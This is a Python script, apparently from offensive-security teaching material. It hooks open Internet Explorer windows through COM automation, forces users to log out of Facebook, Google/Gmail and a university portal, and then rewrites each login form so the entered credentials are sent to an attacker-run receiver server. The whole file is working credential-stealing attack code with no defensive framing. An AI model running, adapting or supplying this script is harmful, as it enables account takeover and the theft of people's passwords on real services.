import win32com.client
import time
import urlparse
import urllib

def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

def main():
    data_receiver = "http://localhost:8080/"

    target_sites = {}
    target_sites["www.facebook.com"] = \
        {"logout_url" : None,
         "logout_form" : "logout_form",
         "login_form_index" : 0,
         "owned" : False}

    target_sites["accounts.google.com"] = \
        {"logout_url" : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
         "logout_form" : None,
         "login_form_index" : 0,
         "owned" : False}

    # target_sites["canopy.uc.edu"] = \
    #     {"logout_url" : "https://canopy.uc.edu/webapps/portal/execute/tabs/tabAction?tab_tab_group_id=_302_1",
    #      "logout_form" : None,
    #      "login_form_index" : 0,
    #      "owned" : False}

    target_sites["canopy.uc.edu"] = \
        {"logout_url" : None,
         "logout_form" : "logout_form",
         "login_form_index" : 0,
         "owned" : False}

    # use the same target for multiple Gmail domains
    target_sites["www.gmail.com"]   = target_sites["accounts.google.com"]
    target_sites["mail.google.com"] = target_sites["accounts.google.com"]

    clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

    windows = win32com.client.Dispatch(clsid)

    while True:
        for browser in windows:
            url = urlparse.urlparse(browser.LocationUrl)

            if url.hostname in target_sites:
                if target_sites[url.hostname]["owned"]:
                    continue

                # if there's a URL, we can just redirect
                if target_sites[url.hostname]["logout_url"]:
                    browser.Navigate(target_sites[url.hostname]["logout_url"])
                    wait_for_browser(browser)
                else:
                    # retrieve all elements in the document
                    full_doc = browser.Document.all

                    # iterate, looking for the logout form
                    for i in full_doc:
                        try:
                            # find the logout form and submit it
                            if i.id == target_sites[url.hostname]["logout_form"]:
                                i.submit()
                                wait_for_browser(browser)
                        except:
                            pass

                # now we modify the login form
                try:
                    # for i in full_doc:
                    #     htmlObject = i
                    #     id = i.id
                    #     found_login = (id == u'login')
                    #     if found_login:
                    #         full_doc_forms = htmlObject.forms
                    #     test = 0

                    login_index = target_sites[url.hostname]["login_form_index"]
                    login_page = urllib.quote(browser.LocationUrl)
                    doc = browser.Document
                    doc_forms = doc.forms
                    browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                    target_sites[url.hostname]["owned"] = True
                except:
                    pass
        time.sleep(5)

if __name__ == "__main__":
    main()